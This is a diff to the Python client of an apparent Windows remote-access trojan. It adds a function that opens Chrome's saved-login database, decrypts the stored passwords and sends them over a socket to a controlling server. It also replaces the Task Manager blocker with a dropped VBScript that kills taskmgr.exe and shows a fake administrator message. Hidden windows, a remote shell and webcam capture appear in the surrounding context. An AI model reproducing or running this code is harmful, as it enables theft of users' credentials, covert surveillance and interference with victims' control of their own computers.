@@ -1,5 +1,5 @@
-import socket, os, sys, platform, pyautogui, time, ctypes, subprocess, webbrowser, threading
-import win32console, win32gui, win32api, winerror, win32event, win32ui
+import socket, os, sys, platform, pyautogui, time, ctypes, subprocess, webbrowser, sqlite3
+import win32console, win32gui, win32api, winerror, win32event, win32crypt
 import pygame.camera, pygame.image
 from shutil import copyfile
 from winreg import *
@@ -21,7 +21,6 @@ ICON_INFO = 0x40
 ICON_STOP = 0x10
 
 MessageBox = ctypes.windll.user32.MessageBoxW
-
 
 def hide():  # hide window
     window = win32console.GetConsoleWindow()
@@ -229,16 +228,47 @@ def command_shell():
 
 
 def disable_taskmgr():
-    while True:
-        time.sleep(0.5)  # check every half second
-        try:
-            win32ui.FindWindow(None, "Windows Task Manager")
-        except win32ui.error:
-            continue
-        subprocess.Popen(["taskkill", "/f", "/im", "taskmgr.exe"], shell=True)
+    # VBScript to disable taskmgr, this allows the script to disconnect from the original python process
+    strVBSCode = "Set objWshShl = WScript.CreateObject(\"WScript.Shell\")" + "\n" + \
+                 "Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!//./root/cimv2\")" + "\n" + \
+                 "Set colMonitoredProcesses = objWMIService.ExecNotificationQuery(\"select * " \
+                 "from __instancecreationevent \" & \" within 1 where TargetInstance isa 'Win32_Process'\")" + "\n" + \
+                 "Do" + "\n" + "Set objLatestProcess = colMonitoredProcesses.NextEvent" + "\n" + \
+                 "If objLatestProcess.TargetInstance.Name = \"taskmgr.exe\" Then" + "\n" + \
+                 "objLatestProcess.TargetInstance.Terminate" + "\n" + \
+                 "objWshShl.Popup \"Task Manager has been disabled by your administrator.\", 3, \"Task Manager\", 16" + "\n" + \
+                 "End If" + "\n" + "Loop"
 
-        # fake error message
-        MessageBox(None, "Task Manager has been disabled by your administrator.", "Task Manager", MB_OK | ICON_STOP)
+    objVBSFile = open(TMP + "/d.vbs", "w")  # write the code and close the file
+    objVBSFile.write(strVBSCode); objVBSFile.close()
+
+    subprocess.Popen(["wscript", TMP + "/d.vbs"])  # run the script
+    return "True"
+
+
+def chrpass():  # legal purposes only!
+    strPath = APPDATA + "/../Local/Google/Chrome/User Data/Default/Login Data"
+    conn = sqlite3.connect(strPath)  # connect to database
+    objCursor = conn.cursor()
+
+    try:
+        objCursor.execute("Select action_url, username_value, password_value FROM logins")  # look for credentials
+    except:  # if the chrome is open
+        objSocket.send(str.encode("error"))
+        return
+
+    strResults = "Chrome Saved Passwords:" + "\n"
+
+    for result in objCursor.fetchall():  # get data as raw text from sql db
+        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
+        if password:
+            strResults += "Site: " + result[0] + "\n" + "Username: " + result[1] + "\n" + "Password: " \
+                          + "\n" + str(password)
+
+    strBuffer = str(len(strResults))
+    objSocket.send(str.encode(strBuffer))  # send buffer
+    time.sleep(0.2)
+    objSocket.send(str.encode(strResults))
 
 while True:
     strData = objSocket.recv(1024)
@@ -271,6 +301,8 @@ while True:
         command_shell()
     elif strData == "webpic":
         webcam_pic()
+    elif strData == "chrpass":
+        chrpass()
     elif strData == "dtaskmgr":
-        if not "objTaskmgr" in globals():  # check to make sure task manager is not already disabled
-            objTaskmgr = threading.Thread(target=disable_taskmgr, daemon=True).start()  # run function as new thread
+        if not "taskmgr" in globals():  # check to make sure task manager is not already disabled
+            taskmgr = disable_taskmgr()
